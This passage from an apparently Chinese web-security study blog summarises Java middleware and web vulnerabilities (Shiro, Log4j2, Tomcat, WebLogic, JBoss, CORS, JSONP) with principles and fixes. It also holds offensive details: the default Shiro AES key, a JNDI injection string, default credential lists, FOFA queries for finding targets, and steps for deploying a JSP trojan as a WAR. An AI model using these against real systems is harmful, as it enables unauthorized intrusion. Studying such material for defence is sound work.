class="header-anchor" href="#spring-rce">¶</a>spring rce</h2><p>Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</p><p><strong>漏洞原理</strong></p><p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中 RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码</p><p><strong>fofa:</strong></p><p>icon_hash=“116323821”</p><p><strong>spring的特征</strong></p><ol><li>icon 是个小树叶</li><li>默认报错页面</li></ol><p><strong>其他利用方式</strong></p><p><a href="https://xie.infoq.cn/article/a60c8897b4bd0dbfe08cf7260">https://xie.infoq.cn/article/a60c8897b4bd0dbfe08cf7260</a> <a href="https://xie.infoq.cn/article/77266744d4eea813a20716fb5">https://xie.infoq.cn/article/77266744d4eea813a20716fb5</a> <a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p><h1>shiro</h1><h2 id="shiro-反序列化rce"><a class="header-anchor" href="#shiro-反序列化rce">¶</a>shiro 反序列化rce</h2><h3 id="Shiro-550-反序列化rce"><a class="header-anchor" href="#Shiro-550-反序列化rce">¶</a>Shiro-550 反序列化rce</h3><p>漏洞原理</p><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的 cookie。</p><p>cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。</p><p>在服务端接收cookie值时，按照如下步骤来解析处理</p><p>1、检索RememberMe cookie 的值</p><p>2、Base64解码</p><p>3、使用AES解密(加密密钥硬编码)</p><p>4、进行反序列化操作（未作过滤处理）</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><p><strong>利用条件</strong></p><p>获得aes的加密密钥</p><p>在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为 kPH+bIxk5D2deZiIxcaaaA==，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞</p><p>尽管目前已经更新了许多版本，<strong>官方并没有对反序列化漏洞本身解决</strong>，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码， 这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。</p><blockquote><p>只要rememberMe的AES加密秘钥泄露，<strong>无论shiro是什么版本都会导致反序列化漏洞</strong>。</p></blockquote><p><strong>fofa：</strong></p><p>app=“Apache-Shiro” header=“rememberme=deleteMe” header=“shiroCookie”</p><h2 id="Shiro-721-反序列化漏洞"><a class="header-anchor" href="#Shiro-721-反序列化漏洞">¶</a>Shiro-721 反序列化漏洞</h2><p><strong>Shiro Padding Oracle Attack</strong></p><p><strong>漏洞原理</strong></p><p>由于Apache Shiro cookie中通过 AES-128-CBC模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p><strong>利用技巧</strong></p><p>1.该漏洞需要登录后获取到合法的Cookie: rememberMe=XXX后才可以进行利用, 看起来不是很好利用 但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥 所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性 ；<br>2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 rememberMe。</p><p><strong>shiro550和721的区别</strong></p><p>​    721是需要知道已经登陆用户的合法cookie  550不用登录就可以直接跑key;</p><p>​550先base64解码然后AES解密再反序列化； 721的加密方式是通过<code>AES-128-CBC</code>模式加密</p><p>后续待补充……</p><h1>fastjson反序列化漏洞</h1><p><strong>原理</strong>：漏洞利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验<br>证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过<br>这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步<br>对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。</p><h1>Log4j2注入漏洞</h1><p>参考文档：<a href="https://blog.csdn.net/hilaryfrank/article/details/121944757?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121944757.142%5Ev93%5EchatgptT3_2&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/hilaryfrank/article/details/121944757?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2漏洞的原理&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121944757.142^v93^chatgptT3_2&amp;spm=1018.2226.3001.4187</a></p><p>复现：</p><p><a href="https://blog.csdn.net/weixin_53747497/article/details/129906229?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-129906229.142%5Ev93%5Einsert_down28v1&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_53747497/article/details/129906229?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j漏洞复现&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-129906229.142^v93^insert_down28v1&amp;spm=1018.2226.3001.4187</a></p><p>Log4j2漏洞总的来说就是：因为Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</p><p><strong>漏洞适应版本</strong>：2.0 &lt;= Apache log4j2 &lt;=2.14.1</p><h3 id="什么是JNDI"><a class="header-anchor" href="#什么是JNDI">¶</a>什么是JNDI</h3><p>JNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。</p><p><strong>JDNI通过绑定的概念将对象和名称联系起来</strong>。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</p><p>简单来说：通过JNDI提供了&quot;通过名称找到对应的对象&quot;的规范定义，即SPI功能，实现则由具体的技术支持，如：LDAP，RMI，DNS，Database。</p><h3 id="什么是LDAP"><a class="header-anchor" href="#什么是LDAP">¶</a>什么是LDAP</h3><p>目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。</p><p>LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。</p><p>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p><p>简单来说：LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）。</p><h1>常见中间件漏洞</h1><h2 id="一、Tomcat"><a class="header-anchor" href="#一、Tomcat">¶</a>一、Tomcat</h2><blockquote><p>Fofa :</p><p>app=“tomcat”</p><p>server=“Apache Tomcat” &amp;&amp; body=“Apache Tomcat”</p></blockquote><h3 id="Tomcat介绍"><a class="header-anchor" href="#Tomcat介绍">¶</a>Tomcat介绍</h3><p>tomcat是一个开源而且免费的jsp服务器，默认端口 : 8080，属于轻量级应用服务器。它可以实现 JavaWeb程序的装载，是配置JSP（Java Server Page）和JAVA系统必备的一款环境。</p><h3 id="CVE-2017-12615"><a class="header-anchor" href="#CVE-2017-12615">¶</a>CVE-2017-12615</h3><p><strong>Tomcat put方法任意文件写入漏洞</strong></p><p>当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly初始化参数由默认值设置为false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p><p><strong>漏洞原理</strong></p><p>当在Tomcat的conf（配置目录下）/web.xml配置文件中添加readonly设置为false时，将导致该漏洞产生，（需要允许put请求） , 攻击者可以利用PUT方法通过精心构造的数据包向存在漏洞的服务器里面上传 jsp一句话文件，从而造成远程命令执行，getshell等。</p><p><strong>影响范围</strong></p><p>Apache Tomcat 7.0.0 - 7.0.79</p><p>Apache Tomcat 8.5.19</p><p><strong>漏洞修复</strong></p><p>设置readonly 为 true</p><h3 id="后台弱口令部署war包"><a class="header-anchor" href="#后台弱口令部署war包">¶</a>后台弱口令部署war包</h3><p>在tomcat8环境下默认进入后台的密码为 tomcat/tomcat ，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令。</p><p>认密码:tomcat/tomcat</p><p>补充:</p><p>其他弱口令</p><p>admin:admin ADMIN:ADMIN admin:j5Brn9 admin:None admin:tomcat cxsdk:kdsxc j2deployer:j2deployer ovwebusr:OvW*busr1QCC:QLogic66 role:changethis role1:role1 role1:tomcat root:root tomcat:changethis tomcat:s3cret tomcat:tomcat tomcat:manager xampp:xampp</p><p>制作WAR包，将JSP木马压缩为ZIP格式，然后修改后缀为war就可以了。</p><h3 id="CVE-2020-1938Tomcat文件包含漏洞"><a class="header-anchor" href="#CVE-2020-1938Tomcat文件包含漏洞">¶</a>CVE-2020-1938Tomcat文件包含漏洞</h3><p><strong>漏洞原理</strong></p><p>由于Tomcat AJP协议设计上的缺陷，攻击者通过Tomcat AJP Connector 可以读取或包含Tomcat上所有</p><p>Webapp目录下的任意文件，例如：</p><p>可以读取webapp配置文件或源码文件。</p><p>此外如果目标应用有文件上传的功能情况下，配合为文件包含漏洞利用GetShell。</p><p><strong>影响版本</strong></p><p>Apache Tomcat 6</p><p>Tomcat 7系列 &lt;7.0.100 Tomcat 8系列 &lt; 8.5.51 Tomcat 9 系列 &lt;9.0.31</p><p><strong>漏洞修复</strong></p><ol><li>更新到最新版本</li><li>关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉。</li></ol><Connector port="8009" protocol="AJP/1.3" redirectport="8443"><ol><li>配置ajp配置中的secretRequired跟secret属性来限制认证。</li></ol><h2 id="WebLogic"><a class="header-anchor" href="#WebLogic">¶</a>WebLogic</h2><blockquote><p>Fofa:</p><p>“weblogic”</p><p>app=“Oracle-WebLogic-Server-管理控制台”</p><p>app=“BEA-WebLogic-Server” || app=“Weblogic_interface_7001”</p><p>“WebLogic” &amp;&amp; port=“7001”  &amp;&amp; title==“Error 404–Not Found”</p></blockquote><h3 id="Weblogic介绍"><a class="header-anchor" href="#Weblogic介绍">¶</a>Weblogic介绍</h3><p>​WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间 件，默认端口：7001 WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><h3 id="后台弱口令GetShell"><a class="header-anchor" href="#后台弱口令GetShell">¶</a>后台弱口令GetShell</h3><p>默认账号密码：weblogic/Oracle@123</p><p>上传war包，jsp木马压缩成zip，修改后缀为war，上传，访问部署好的war用蚁剑直接连接。</p><h3 id="CVE-2017-3506反序列化漏洞"><a class="header-anchor" href="#CVE-2017-3506反序列化漏洞">¶</a>CVE-2017-3506反序列化漏洞</h3><p><strong>漏洞描述</strong></p><p>Weblogic的WLS Security组件对外提供了webserver服务，其中使用了XMLDecoder来解析用户输入的 XML数据，在解析过程中出现反序列化漏洞，可导致任意命令执行。</p><p><strong>影响版本</strong></p><p>受影响版本：WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.1, 12.2.1.2。</p><p>访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在</p><p>/wls-wsat/CoordinatorPortType</p><p>/wls-wsat/RegistrationPortTypeRPC</p><p>/wls-wsat/ParticipantPortType</p><p>/wls-wsat/RegistrationRequesterPortType</p><p>/wls-wsat/CoordinatorPortType11</p><p>/wls-wsat/RegistrationPortTypeRPC11</p><p>/wls-wsat/ParticipantPortType11</p><p>/wls-wsat/RegistrationRequesterPortType11</p><p><strong>漏洞修复</strong></p><p>更新到最新版本，打上10271的补丁,对访问wls-wsat的资源进行访问控制 ，或者根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：</p><p>○ Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_interna  l/wls-wsat</p><p>○ Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/w  ls-wsat.war</p><ul><li>Middleware/wlserver_10.3/server/lib/wls-wsat.war</li></ul><p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-  w sat/ 是否为404页面。</p><h3 id="CVE-2019-2725"><a class="header-anchor" href="#CVE-2019-2725">¶</a>CVE-2019-2725</h3><p><strong>漏洞描述</strong></p><p>wls9-async等组件为WebLogic Server提供异步通讯服务，默认应用于WebLogic部分版本。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者通过发送精心构造的恶意 HTTP 请求，即可获得目标服务器的权限，在未授权的情况下远程执行命令。</p><p><strong>影响版本</strong></p><p>weblogic 10.x weblogic 12.1.3</p><p><strong>漏洞修复</strong></p><ol><li>禁用bea_wls9_async_response组件；</li><li>删除wls9_async_response的war包并重启  ；</li><li>禁止访问 /_async/* 路径。</li></ol><h3 id="CVE-2018-2628"><a class="header-anchor" href="#CVE-2018-2628">¶</a>CVE-2018-2628</h3><p><strong>WebLogic T3协议反序列化命令执行漏洞(CVE-2018- 2628)</strong></p><p><strong>漏洞描述</strong></p><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它 Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中,并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启， 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。</p><p><strong>漏洞影响</strong></p><p>Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.2.0 Oracle WebLogic Server12.2.1.3.0</p><p><strong>漏洞修复</strong></p><ol><li>及时更新补丁 ；</li><li>禁用T3协议 ；</li><li>禁止T3端口对外开放，或者限制可访问T3端口的IP来源。</li><li>升级版本</li></ol><h3 id="CVE-2018-2894WebLogic文件任意上传漏洞"><a class="header-anchor" href="#CVE-2018-2894WebLogic文件任意上传漏洞">¶</a>CVE-2018-2894WebLogic文件任意上传漏洞</h3><p><strong>漏洞描述</strong></p><p>Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在 “生产模式” 下默认不开启，所以该漏洞有一定限制。</p><p><strong>漏洞版本</strong></p><p>weblogic 10.3.6.0</p><p>weblogic 12.1.3.0</p><p>weblogic 12.2.1.2</p><p>weblogic 12.2.1.3</p><h3 id="CVE-2020-14882WebLogic远程代码执行漏洞"><a class="header-anchor" href="#CVE-2020-14882WebLogic远程代码执行漏洞">¶</a>CVE-2020-14882WebLogic远程代码执行漏洞</h3><p><strong>漏洞描述</strong></p><p>CVE-2020-14882  允许远程用户绕过管理员控制台组件中的身份验证。</p><p>CVE-2020-14883  允许经过身份验证的用户在管理员控制台组件上执行任何命令。</p><p>使用这两个漏洞链，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执行任意命令并完全控制主机</p><p><strong>影响版本</strong></p><p>Oracle Weblogic Server 10.3.6.0 Oracle Weblogic Server 12.1.3.0 Oracle Weblogic Server 12.2.1.3 Oracle Weblogic Server 12.2.1.4 Oracle Weblogic Server 14.1.1.0</p><h2 id="Jboss"><a class="header-anchor" href="#Jboss">¶</a>Jboss</h2><blockquote><p>Fofa:</p><p>title=“Welcome to JBoss AS” &amp;&amp; country!=“CN”</p></blockquote><h3 id="Jboss介绍"><a class="header-anchor" href="#Jboss介绍">¶</a>Jboss介绍</h3><p>JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得 JBoss广为流行。</p><h3 id="CVE-2015-7501-Jboss-JMXInvokerServlet-反序列化漏洞"><a class="header-anchor" href="#CVE-2015-7501-Jboss-JMXInvokerServlet-反序列化漏洞">¶</a>CVE-2015-7501 Jboss JMXInvokerServlet 反序列化漏洞</h3><p><strong>漏洞介绍</strong></p><p>这是经典的JBoss反序列化漏洞，JBoss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的 Gadget 执行任意代码</p><p><strong>影响范围</strong></p><p>JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10 JBoss AS (Wildly) 6 and earlier</p><p>JBoss A-MQ 6.2.0</p><p>JBoss Fuse 6.2.0</p><p>JBoss SOA Platform (SOA-P) 5.3.1 JBoss Data Grid (JDG) 6.5.0 JBoss BRMS (BRMS) 6.1.0</p><p>JBoss BPMS (BPMS) 6.1.0</p><p>JBoss Data Virtualization (JDV) 6.1.0 JBoss Fuse Service Works (FSW) 6.0.0 JBoss Enterprise Web Server (EWS) 2.1,3.0</p><h2 id="CVE-2017-7504-JBossMQ-JMS-反序列化漏洞"><a class="header-anchor" href="#CVE-2017-7504-JBossMQ-JMS-反序列化漏洞">¶</a>CVE-2017-7504 JBossMQ JMS 反序列化漏洞</h2><p><strong>影响范围</strong></p><p>JBoss 4.x 以及之前的所有版本</p><p><strong>漏洞介绍</strong></p><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的 HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码执行</p><h3 id="CVE-2017-12149JBoss-5-x-6-x反序列化漏洞"><a class="header-anchor" href="#CVE-2017-12149JBoss-5-x-6-x反序列化漏洞">¶</a>CVE-2017-12149JBoss 5.x/6.x反序列化漏洞</h3><p><strong>漏洞简述</strong></p><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞</p><p><strong>漏洞范围</strong></p><p>JBoss 5.x/6.x</p><h3 id="Administration-Console弱口令"><a class="header-anchor" href="#Administration-Console弱口令">¶</a>Administration Console弱口令</h3><p><strong>漏洞描述</strong></p><p>Administration Console管理页面存在弱口令，<code>admin:admin</code>，登陆后台上传war包 , getshell.</p><h3 id="低版本JMX-Console未授权"><a class="header-anchor" href="#低版本JMX-Console未授权">¶</a>低版本JMX Console未授权</h3><p>低版本JMX Console未授权访问Getshell</p><p><strong>漏洞描述</strong></p><p>此漏洞主要是由于 JBoss中/jmx-console/HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到 jmx控制台，并在其中执行任何功能。</p><h3 id="高版本JMX-Console未授权"><a class="header-anchor" href="#高版本JMX-Console未授权">¶</a>高版本JMX Console未授权</h3><p><strong>漏洞描述</strong></p><p>JMX Console默认存在未授权访问，直接点击JBoss主页中的 JMX Console 链接进入JMX Console页面, 通过部署war包 , getshell</p><p><strong>影响版本</strong></p><p>Jboss6.x以下</p><h2 id="Apache"><a class="header-anchor" href="#Apache">¶</a>Apache</h2><h3 id="CVE-2021-41773-Apache-HTTP-Server-路径穿越漏洞"><a class="header-anchor" href="#CVE-2021-41773-Apache-HTTP-Server-路径穿越漏洞">¶</a>CVE-2021-41773  Apache HTTP Server 路径穿越漏洞</h3><p><strong>漏洞简介</strong></p><p>该漏洞是由于Apache HTTP Server 2.4.49版本存在目录穿越漏洞,在路径穿越目录 &lt;Directory</p><p>允许被访问的的情况下（默认开启），攻击者可利用该路径穿</p><p>/&gt;Require all granted</p><p>越漏洞读取到Web目录之外的其他文件</p><p>在服务端开启了gi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意cgi命令（RCE）</p><p><strong>影响版本</strong></p><p>Apache HTTP Server 2.4.49</p><p>某些Apache HTTPd 2.4.50也存在此漏洞</p><h2 id="问题：-v2"><a class="header-anchor" href="#问题：-v2">¶</a>问题：</h2><p><strong>如何判断一个网站是Tomcat/Weblogic/Jboss框架？</strong></p><p>tomcat：</p><ol><li>默认端口 8080</li><li>浏览器的指纹识别插件</li><li>默认管理路由 /manage/html 4.server头 Apache Tomcat</li></ol><p>weblogic：</p><ol><li>浏览器插件</li><li>报错页面 Error 404–Not Found</li><li>默认管理页面路由 /console/login/LoginForm.jsp</li><li>7001端口</li></ol><p>Jboss：</p><ol><li>8080</li><li>浏览器识别插件</li><li>固定路由</li></ol><p>​/admin-console/</p><p>​/jmx-console/</p><ol start="4"><li>title :Welcome to JBoss AS</li></ol><h1>Jsonp&amp;Cors</h1><h2 id="同源策略-v2"><a class="header-anchor" href="#同源策略-v2">¶</a>同源策略</h2><p><strong>SOP</strong>，全称为同源策略 (Same Origin Policy)，同源是指&quot;协议+域名+端口&quot;三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。</p><p>当一个请求url的<strong>协议、域名、端口</strong>三者之间任意一个与当前页面url不同即为<strong>跨域</strong></p><blockquote><p>如果没有同源策略，那么，你打开了一个合法网站，又打开了一个恶意网站。那么恶意网站的脚本能够随意的操作合法网站的任何可操作资源，没有任何限制。</p><p>浏览器要严格隔离两个不同源的网站，目的是保证数据的<strong>完整性和机密性。</strong></p></blockquote><p><strong>ps:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>&lt;script src=<span class="hljs-string">&quot;...&quot;</span>&gt;<span class="hljs-regexp">//</span>加载本地js执行<br><br>&lt;img src=<span class="hljs-string">&quot;...&quot;</span>&gt;<span class="hljs-regexp">//</span>图片<br><br>&lt;link href=<span class="hljs-string">&quot;...&quot;</span>&gt;<span class="hljs-regexp">//</span>css<br><br>&lt;iframe src=<span class="hljs-string">&quot;...&quot;</span>&gt; <span class="hljs-regexp">//</span>任意资源<br></code></pre></td></tr></table></figure><h2 id="CORS-v2"><a class="header-anchor" href="#CORS-v2">¶</a>CORS</h2><p>CORS（Cross-Origin Resource Sharing）<strong>跨域资源共享</strong>，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AX只能同源使用的 限制。</p><p>CORS的基本原理是：第三方网站生成访问控制策略，指定用户浏览器放宽SOP的限制，实现与指定的目标网站共享数据。</p><h3 id="CORS跨域漏洞"><a class="header-anchor" href="#CORS跨域漏洞">¶</a>CORS跨域漏洞</h3><p>介绍：因为同源策略的存在，不同源的客户端脚本不能访问目标站点的资源，如果目标站点CORS配置不当，没有对请求源的域做严格限制，导致任意源都可以访问时，就存在cors跨域漏洞问题。</p><p>原理：攻击者可以利用Web应用对用户请求数据包的Origin头校验不严格，诱骗受害者访问攻击者制作好的恶意网站，从而跨域获取受害者的敏感数据.</p><p><strong>本质</strong>是服务器配置不当</p><p>即<strong>Access-Control-Allow-Origin</strong>取自请求头Orgin字段，<strong>Access-Contorl-Allow-Credentials</strong>设置为true。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">GET / HTTP/<span class="hljs-number">1.1</span><br>HOST:<span class="hljs-built_in">exp</span>.<span class="hljs-keyword">com</span> Origin:www.<span class="hljs-built_in">exp</span>.<span class="hljs-keyword">com</span><br><span class="hljs-number">200</span> HTTP/<span class="hljs-number">1.1</span> OK<br>Access-Control-Allow-Origin:www.<span class="hljs-built_in">exp</span>.<span class="hljs-keyword">com</span> Access-Contorl-Allow-Credential<span class="hljs-variable">s:true</span><br></code></pre></td></tr></table></figure><p>导致攻击者可以构造恶意的脚本，诱导用户点击获取用户敏感数据。</p><p>如果返回以下，可认为不存在漏洞，因为CORS安全机制阻止了这种情况下的漏洞利用。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Access</span>-Control-Allow-Origin: *<br><br><span class="hljs-keyword">Access</span>-Control-Allow-Credentials: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><strong>Access-Control-Allow-Origin</strong>：指定哪些外域可以访问本域资源；</p><p><strong>Access-Control-Allow-Credentials</strong>：指定浏览器是否将使用请求发送Cookie。仅当设置为true</p><p>时，才会发送Cookie；默认是false</p><p><strong>Access-Control-Allow-Headers</strong>：指定可以在请求报文中添加的HTTP头字段； Access-Control-Max-Age：指定超时时间；</p><h3 id="CORS漏洞危害"><a class="header-anchor" href="#CORS漏洞危害">¶</a>CORS漏洞危害</h3><p>攻击者构造恶意的html页面，利用链接诱导受害者进行点击，从而获取受害者的敏感信息。</p><h3 id="CORS挖掘思路-v2"><a class="header-anchor" href="#CORS挖掘思路-v2">¶</a>CORS挖掘思路</h3><p>CORS的漏洞主要看当我们发起的请求中带有Origin 头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin 的域访问。</p><h2 id="JSONP-v2"><a class="header-anchor" href="#JSONP-v2">¶</a>JSONP</h2><p>JSONP是JSON with   padding（填充式JSON或参数式JSON）的简写，是基于JSON格式达的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用的script标签的src属性不受同源策略影响的特   性，来跨越获取数据。</p><p>简单来说：可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p><p>JSONP由两部分组成： <strong>回调函数</strong> 、 <strong>数据</strong></p><p>**回调函数 **是当响应来时，在页面中调用的函数。回调函数的名称一般是在请求中指定的。而数据就是传入回调函数中的JSON数据。</p><h3 id="JSONP劫持漏洞-v2"><a class="header-anchor" href="#JSONP劫持漏洞-v2">¶</a>JSONP劫持漏洞</h3><p>JSON劫持又称 “JSON Hijacking” 。当网站通过JSONP的方式来跨域传递用户认证后的敏感信息时，<strong>如果服务端对JSONP的请求来源校验不严格，那么攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问达到截取用户敏感信息的目的</strong>。</p><p><strong>产生漏洞的原因</strong>：    网站没有对JSONP请求来源进行校验和过滤导致任意域都能够获取数据。</p><p>利用过程：寻找敏感 json 数据 api 接口，构造恶意的代码。 发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器。</p><img src="/posts/d62edc36/1690266827967-c7f3cd69-031d-4069-9917-2d915dc64930-1693987765629-1.jpeg" class title="img"><h3 id="JSONP的危害"><a class="header-anchor" href="#JSONP的危害">¶</a>JSONP的危害</h3><p>攻击者构造恶意的html页面，利用链接诱导受害者进行点击，从而获取到受害者的敏感信息</p><h3 id="JSONP漏洞挖掘思路-v2"><a class="header-anchor" href="#JSONP漏洞挖掘思路-v2">¶</a>JSONP漏洞挖掘思路</h3><p>Google Hack语法</p><p>inurl:json inurl:callback= site:a.com inurl:json</p><p>Burp插件推荐</p><p><a href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p><h3 id="防御方案-v2"><a class="header-anchor" href="#防御方案-v2">¶</a>防御方案</h3><ol><li><p>json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 xmlhttp 的方式作为数 据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据，如果是跨域的数据传输，必须要对敏 感的数据获取做权限认证；</p></li><li><p>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等；</p></li><li><p>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）</p></li><li><p>严格过滤 callback 函数名及 JSON 里数据的输出；</p></li><li><p>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)；</p></li></ol></Connector>]]></content>
    
    
    <categories>
      
      <category>理论知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>面试总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用友时空KSOA ImageUpload任意文件上传漏洞复现</title>
    <link href="/posts/b7d90640.html"/>
    <url>/posts/b7d90640.html</url>
    
